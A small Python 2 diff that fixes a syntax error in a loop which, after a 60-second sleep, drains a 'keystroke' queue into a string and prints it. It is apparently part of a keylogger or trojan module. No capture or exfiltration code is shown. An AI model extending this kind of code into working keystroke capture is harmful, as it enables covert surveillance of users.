@@ -92,7 +92,7 @@ def run(**args):
 	time.sleep(60)
 
         retval = ""
-        while not keystroke.empty()
+        while not keystroke.empty():
             retval = retval + str(keystroke.get())
 
         print retval
